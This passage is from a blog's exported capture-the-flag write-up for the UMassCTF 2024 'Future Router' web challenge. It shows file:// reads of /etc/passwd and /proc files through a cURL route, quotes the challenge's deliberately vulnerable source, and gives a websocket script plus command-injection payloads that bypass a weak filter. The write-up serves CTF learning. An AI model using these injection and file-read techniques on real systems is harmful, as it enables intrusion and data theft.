self.Dialogue[\"Problem\"]\n        else:\n            return \"I could not understand your message, this agent is under construction. Please use the other implemented features for now!\"\n    def xor_decrypt(self,ciphertext):\n        plaintext = \"\"\n        cipher_arr = bytearray(ciphertext)\n        for i in range(0,len(cipher_arr)):\n            plaintext += chr(cipher_arr[i] ^ self.SECRET_KEY[i % len(self.SECRET_KEY)])\n        return plaintext\n\nKarenAgent = KarenCustomerServiceAgent()\n\nasync def respond(websocket):\n    async for message in websocket:\n        data = KarenAgent.xor_decrypt(message.encode('latin-1'))\n        response = KarenAgent.handle_input(data)\n        await websocket.send(response)\n\nasync def main():\n    async with serve(respond, \"0.0.0.0\", 9000):\n        await asyncio.Future()  # run forever\n\nasyncio.run(main())          \n```\n\nFor now, let's set aside this file and explore another functionality: `/customerservice`.\n\nThis route hosts a websocket application. Despite attempting various inputs such as `hi` or `hello`, we encountered no success. This outcome was unsurprising upon reviewing the source code.\n\n![ws](./images/umass/ws.png)\n\nAfter analyzing the source code, we observed that the input is initially decoded using the `xor_decrypt` function before being passed into the `handle_input()` function.\n\nIf the message contains `hello` after decryption, the application responds with the welcome message.\n\nLet's proceed with a test.\n\nSo here is our script\n\n```python\nimport asyncio\nimport websockets\n\nSECRET_KEY = bytearray(b\"\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.\")\n\ndef xor_encrypt(plaintext):\n    ciphertext = \"\"\n    for i in range(len(plaintext)):\n        ciphertext += chr(plaintext[i] ^ SECRET_KEY[i % len(SECRET_KEY)])\n    return ciphertext\n\nplaintext = \"hello\"\nciphertext = xor_encrypt(plaintext.encode())\n\nasync def send_message():\n    uri = \"ws://future-router.ctf.umasscybersec.org/app/\"\n    # uri = 'ws://0.0.0.0:9000/'\n    async with websockets.connect(uri) as websocket:\n        await websocket.send(ciphertext)\n        response = await websocket.recv()\n        print(\"Response from server:\", response)\n\nasyncio.run(send_message())\n```\n\nAnd bingo we get the welcome message in response\n\n![welcome](./images/umass/welcome.png)\n\nUpon further analysis of the code, we discovered a command injection vulnerability triggered when sending `krabby patty` in the message. Although the code includes some filters, they can be bypassed using `$(test_cmd)`. To view the response, we redirected the output of the command injection to a file and then accessed it using the cURL functionality.\n\nLet's proceed with the command `krabby patty $(ls > /tmp/output.txt)`. The response from the websocket server matched our expectations:\n\n```\nResponse from server: Thank you for your input, we will process your request in 1-3 business days\n```\n\nSubsequently, reading the file from cURL using `file:///tmp/output.txt` yielded the desired response.\n\n\n![ls](./images/umass/ls.png)\n\nLet's list the files of `/` using `krabby patty $(ls / > /tmp/output.txt)` as input\n![lsroot](./images/umass/lsroot.png)\n\nWe can see the name of the flag file as `flag53958e73c5ba4a66`.\n\nWe also attempted alternative approaches, such as accessing the hostname provided on the dashboard using the cURL route. However, the static source code did not provide any useful information in this regard.\n\ninput = `http://hostname:80/`\n\nOne example\n\n![testing](./images/umass/testing.png)\n\n## Obtaining the Flag\n\nNow just read the file using `krabby patty $(cat /flag53958e73c5ba4a66 > /tmp/output.txt)`\n\n![Flag](./images/umass/flag.png) \n\nFlag: **UMASS{W3lC0m3_t0_Th3_FuTur3_Kr4bS_c28e1089b2}**\n\nThank You","slug":"UMassCTF24_Writeup","published":1,"date":"2024-05-14T10:20:19.793Z","updated":"2024-05-14T10:20:19.793Z","comments":1,"layout":"post","photos":[],"_id":"clw6937yv0001mnid526jdyke","content":"<h1 id=\"UMassCTF-2024\"><a href=\"#UMassCTF-2024\" class=\"headerlink\" title=\"UMassCTF 2024\"></a>UMassCTF 2024</h1><h1 id=\"Web-Future-Router\"><a href=\"#Web-Future-Router\" class=\"headerlink\" title=\"Web&#x2F;Future Router\"></a>Web&#x2F;Future Router</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p><code>Description</code> : Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he’s tasked you with figuring out where the router is from and finding a flag!</p>\n<p>We were given access to a website at <a href=\"http://future-router.ctf.umasscybersec.org/\">this link</a>. </p>\n<p>So here is an image how the website looks like</p>\n<p><img src=\"/./images/umass/index.png\" alt=\"Index\"></p>\n<p>The site features three main routes:</p>\n<ul>\n<li>Dashboard –&gt; <code>/dash</code></li>\n<li>cURL –&gt; <code>/cURL</code></li>\n<li>FuTuR3 r0UT3R Customer Service –&gt; <code>/customerservice</code></li>\n</ul>\n<p><img src=\"/./images/umass/dash.png\" alt=\"dash\"></p>\n<p><img src=\"/./images/umass/curl.png\" alt=\"curl\"></p>\n<p><img src=\"/./images/umass/service.png\" alt=\"service\"></p>\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>So let’s analyse every route.</p>\n<ul>\n<li><p><code>dash</code> –&gt; Upon exploring the Dashboard route, we discovered information about three devices, each with a <code>hostname</code> and <code>port</code> specified.</p>\n<ul>\n<li><p>Hostname:patricks-rock,<br>Port - Service,<br>http:80</p>\n</li>\n<li><p>Hostname:spongebobs-spatula,<br>Port - Service,<br>http:80</p>\n</li>\n<li><p>Hostname:squidwards-clarinet,<br>Port - Service,<br>http:80</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>Attempts to access these devices via our browser were unsuccessful. However, we speculated that one of these devices might contain the email address mentioned in the challenge description. For now, we set this aside for further investigation.</p>\n<ul>\n<li><code>cURL</code> –&gt; The cURL route presented a simple tool for fetching URLs and displaying their responses.</li>\n</ul>\n<p>For example if we pass <code>www.google.com</code> as input displays the response from the specified URL.</p>\n<p><img src=\"/./images/umass/example.png\" alt=\"example\"></p>\n<p>We quickly realized that we could leverage this tool to read local files by utilizing the <code>file://</code> protocol. This allowed us to access sensitive system files such as <code>/etc/passwd</code>, indicating a potential security vulnerability.</p>\n<p><img src=\"/./images/umass/passwd.png\" alt=\"passwd\"></p>\n<p>At this moment I thought we have to find a flag.txt on the machine by hit and trial in every directory possible.</p>\n<p>But then I tried accessing <code>/proc/self/cmdline</code> as my second approach and we can see it is a python gunicorn gateway application.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># cmdline</span></span><br><span class=\"line\">/usr/local/bin/python/usr/local/bin/gunicorn-w4--bind0.0.0.0:8000app:app</span><br></pre></td></tr></table></figure>\n\n<p>Hence I tried reading the <code>app.py</code> in the current working directory using <code>file:///proc/self/cwd/app.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># app.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> blueprints.routes <span class=\"keyword\">import</span> httpserver</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"><span class=\"comment\"># This web server is the property of Sheldon J. Plankton, </span></span><br><span class=\"line\"><span class=\"comment\"># please refrain from reading this secret source code.</span></span><br><span class=\"line\"><span class=\"comment\"># I WILL USE THIS ROUTER TO STEAL THE SECRET KRABBY PATTY FORMULA!</span></span><br><span class=\"line\">app.register_blueprint(httpserver, url_prefix=<span class=\"string\">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>The source code is hidden somehow and we have to find the way to read it as mentioned in the comments of the <code>app.py</code></p>\n<p>When I tried to access <code>/proc/self/environ</code> it gave me the name of directory –&gt; <code>/planktonsrouter1ba8b69e</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># environ</span></span><br><span class=\"line\">OLDPWD=/PWD=/planktonsrouter1ba8b69e</span><br></pre></td></tr></table></figure>\n<p>As it is using blueprints we can read the source code through <code>file:///planktonsrouter1ba8b69e/blueprints/routes.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># routes.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, render_template, Blueprint,send_from_directory</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> pycurl </span><br><span class=\"line\"></span><br><span class=\"line\">httpserver = Blueprint(<span class=\"string\">&#x27;httpserver&#x27;</span>, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#@httpserver.route(&quot;/docs&quot;,methods=[&quot;GET&quot;])</span></span><br><span class=\"line\"><span class=\"comment\">#def docs():</span></span><br><span class=\"line\"><span class=\"comment\">#   return &quot;&quot;&quot;&lt;!doctype html&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#    &lt;h1&gt;Router Docs&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#    &lt;h2&gt;Websocket API&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#    &lt;strong&gt;<span class=\"doctag\">TODO:</span> Document how to talk to </span></span><br><span class=\"line\"><span class=\"comment\">#   Karen&#x27;s customer service module in ../karen/customerservice.py</span></span><br><span class=\"line\"><span class=\"comment\">#   Also figure out how to use supervisord better.&lt;/strong&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Securely CURL URLs, absolutely no bugs here!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/static/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">static</span>(<span class=\"params\">path</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> send_from_directory(<span class=\"string\">&#x27;static&#x27;</span>,path)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/cURL&quot;</span>,methods=[<span class=\"string\">&quot;GET&quot;</span>,<span class=\"string\">&quot;POST&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">curl</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.method == <span class=\"string\">&quot;GET&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;curl.html&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span>(request.method == <span class=\"string\">&quot;POST&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            buffer = BytesIO()</span><br><span class=\"line\">            c = pycurl.Curl()</span><br><span class=\"line\">            c.setopt(c.URL, request.json[<span class=\"string\">&#x27;URL&#x27;</span>])</span><br><span class=\"line\">            c.setopt(c.WRITEDATA, buffer)</span><br><span class=\"line\">            c.perform()</span><br><span class=\"line\">            c.close()</span><br><span class=\"line\">            DATA = buffer.getvalue()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;success&quot;</span>:DATA.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;error&quot;</span>:<span class=\"built_in\">str</span>(e.with_traceback(<span class=\"literal\">None</span>))&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/customerservice&quot;</span>,methods=[<span class=\"string\">&quot;GET&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">customerservice</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;customerservice.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">NETWORK = [</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;hostname&#x27;</span>:<span class=\"string\">&#x27;patricks-rock&#x27;</span>,<span class=\"string\">&#x27;ports&#x27;</span>:[&#123;<span class=\"string\">&#x27;service&#x27;</span>:<span class=\"string\">&#x27;http&#x27;</span>,<span class=\"string\">&#x27;num&#x27;</span>:<span class=\"number\">80</span>&#125;]&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;hostname&#x27;</span>:<span class=\"string\">&#x27;spongebobs-spatula&#x27;</span>,<span class=\"string\">&#x27;ports&#x27;</span>:[&#123;<span class=\"string\">&#x27;service&#x27;</span>:<span class=\"string\">&#x27;http&#x27;</span>,<span class=\"string\">&#x27;num&#x27;</span>:<span class=\"number\">80</span>&#125;]&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;hostname&#x27;</span>:<span class=\"string\">&#x27;squidwards-clarinet&#x27;</span>,<span class=\"string\">&#x27;ports&#x27;</span>:[&#123;<span class=\"string\">&#x27;service&#x27;</span>:<span class=\"string\">&#x27;http&#x27;</span>,<span class=\"string\">&#x27;num&#x27;</span>:<span class=\"number\">80</span>&#125;]&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/dash&quot;</span>,methods=[<span class=\"string\">&quot;GET&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dash</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;dashboard.html&#x27;</span>,network=NETWORK)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello_world</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>)   </span><br></pre></td></tr></table></figure>\n\n\n<p>We noticed a Python file mentioned in the comment <code>../karen/customerservice.py</code>. However, while we were solving, we found the file name using an alternative approach.</p>\n<p>Exploring the <code>/proc</code> directory, we experimented with different process IDs (PIDs).</p>\n<p>In <code>/proc/1/cmdline</code> we can see a bash script being run <code>entrypoint.sh</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># entrypoint.sh</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /planktonsrouter1ba8b69e</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Loop to monitor and restart Gunicorn if it crashes</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Restarting Gunicorn...&quot;</span></span><br><span class=\"line\">    gunicorn -w 4 --<span class=\"built_in\">bind</span> 0.0.0.0:8000 <span class=\"string\">&#x27;app:app&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span> &amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Loop to monitor and restart customerservice.py if it crashes</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">    python3 karen/customerservice.py</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Restarting Customer Service...&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span> &amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Loop to clean up old files in /tmp every 15 seconds</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">    find /tmp/* -<span class=\"built_in\">type</span> f -mmin +2 -<span class=\"built_in\">exec</span> <span class=\"built_in\">rm</span> -f &#123;&#125; +</span><br><span class=\"line\">    <span class=\"built_in\">sleep</span> 15</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio, os, re</span><br><span class=\"line\"><span class=\"keyword\">from</span> websockets.server <span class=\"keyword\">import</span> serve</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Due to security concerns, I, Sheldon J. Plankton have ensured this module</span></span><br><span class=\"line\"><span class=\"comment\"># has no access to any internet service other than those that are</span></span><br><span class=\"line\"><span class=\"comment\"># trusted. This agent will trick Krabs into sending me the secret</span></span><br><span class=\"line\"><span class=\"comment\"># krabby patty formula which I will log into Karen&#x27;s secret krabby patty </span></span><br><span class=\"line\"><span class=\"comment\"># secret formula file! First, I have to fix a few security bugs!</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">KarenCustomerServiceAgent</span>:</span><br><span class=\"line\">    SECRET_KEY = <span class=\"built_in\">bytearray</span>(<span class=\"string\">b&quot;\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.&quot;</span>)</span><br><span class=\"line\">    Dialogue = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;Welcome&quot;</span>:<span class=\"string\">&quot;Hello! Welcome to the Future Router service bot!&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;Secret formula&quot;</span>:<span class=\"string\">&quot;Thank you for your input, we will process your request in 1-3 business days&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;Problem&quot;</span>:<span class=\"string\">&quot;Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">handle_input</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">&quot;hello&quot;</span> <span class=\"keyword\">in</span> message):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.Dialogue[<span class=\"string\">&quot;Welcome&quot;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(<span class=\"string\">&quot;krabby patty&quot;</span> <span class=\"keyword\">in</span> message):</span><br><span class=\"line\">            filtered_message = re.sub(<span class=\"string\">r&quot;(\\&quot;|\\&#x27;|\\;|\\&amp;|\\|)&quot;</span>,<span class=\"string\">&quot;&quot;</span>,message)</span><br><span class=\"line\">            os.system(<span class=\"string\">f&#x27;echo &quot;<span class=\"subst\">&#123;filtered_message&#125;</span>\\n&quot; &gt;&gt; /dev/null&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.Dialogue[<span class=\"string\">&quot;Secret formula&quot;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(<span class=\"string\">&quot;problem&quot;</span> <span class=\"keyword\">in</span> message):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.Dialogue[<span class=\"string\">&quot;Problem&quot;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;I could not understand your message, this agent is under construction. Please use the other implemented features for now!&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">xor_decrypt</span>(<span class=\"params\">self,ciphertext</span>):</span><br><span class=\"line\">        plaintext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        cipher_arr = <span class=\"built_in\">bytearray</span>(ciphertext)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(cipher_arr)):</span><br><span class=\"line\">            plaintext += <span class=\"built_in\">chr</span>(cipher_arr[i] ^ self.SECRET_KEY[i % <span class=\"built_in\">len</span>(self.SECRET_KEY)])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> plaintext</span><br><span class=\"line\"></span><br><span class=\"line\">KarenAgent = KarenCustomerServiceAgent()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">respond</span>(<span class=\"params\">websocket</span>):</span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">for</span> message <span class=\"keyword\">in</span> websocket:</span><br><span class=\"line\">        data = KarenAgent.xor_decrypt(message.encode(<span class=\"string\">&#x27;latin-1&#x27;</span>))</span><br><span class=\"line\">        response = KarenAgent.handle_input(data)</span><br><span class=\"line\">        <span class=\"keyword\">await</span> websocket.send(response)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> serve(respond, <span class=\"string\">&quot;0.0.0.0&quot;</span>, <span class=\"number\">9000</span>):</span><br><span class=\"line\">        <span class=\"keyword\">await</span> asyncio.Future()  <span class=\"comment\"># run forever</span></span><br><span class=\"line\"></span><br><span class=\"line\">asyncio.run(main())          </span><br></pre></td></tr></table></figure>\n\n<p>For now, let’s set aside this file and explore another functionality: <code>/customerservice</code>.</p>\n<p>This route hosts a websocket application. Despite attempting various inputs such as <code>hi</code> or <code>hello</code>, we encountered no success. This outcome was unsurprising upon reviewing the source code.</p>\n<p><img src=\"/./images/umass/ws.png\" alt=\"ws\"></p>\n<p>After analyzing the source code, we observed that the input is initially decoded using the <code>xor_decrypt</code> function before being passed into the <code>handle_input()</code> function.</p>\n<p>If the message contains <code>hello</code> after decryption, the application responds with the welcome message.</p>\n<p>Let’s proceed with a test.</p>\n<p>So here is our script</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio</span><br><span class=\"line\"><span class=\"keyword\">import</span> websockets</span><br><span class=\"line\"></span><br><span class=\"line\">SECRET_KEY = <span class=\"built_in\">bytearray</span>(<span class=\"string\">b&quot;\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor_encrypt</span>(<span class=\"params\">plaintext</span>):</span><br><span class=\"line\">    ciphertext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(plaintext)):</span><br><span class=\"line\">        ciphertext += <span class=\"built_in\">chr</span>(plaintext[i] ^ SECRET_KEY[i % <span class=\"built_in\">len</span>(SECRET_KEY)])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ciphertext</span><br><span class=\"line\"></span><br><span class=\"line\">plaintext = <span class=\"string\">&quot;hello&quot;</span></span><br><span class=\"line\">ciphertext = xor_encrypt(plaintext.encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">send_message</span>():</span><br><span class=\"line\">    uri = <span class=\"string\">&quot;ws://future-router.ctf.umasscybersec.org/app/&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># uri = &#x27;ws://0.0.0.0:9000/&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> websockets.connect(uri) <span class=\"keyword\">as</span> websocket:</span><br><span class=\"line\">        <span class=\"keyword\">await</span> websocket.send(ciphertext)</span><br><span class=\"line\">        response = <span class=\"keyword\">await</span> websocket.recv()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Response from server:&quot;</span>, response)</span><br><span class=\"line\"></span><br><span class=\"line\">asyncio.run(send_message())</span><br></pre></td></tr></table></figure>\n\n<p>And bingo we get the welcome message in response</p>\n<p><img src=\"/./images/umass/welcome.png\" alt=\"welcome\"></p>\n<p>Upon further analysis of the code, we discovered a command injection vulnerability triggered when sending <code>krabby patty</code> in the message. Although the code includes some filters, they can be bypassed using <code>$(test_cmd)</code>. To view the response, we redirected the output of the command injection to a file and then accessed it using the cURL functionality.</p>\n<p>Let’s proceed with the command 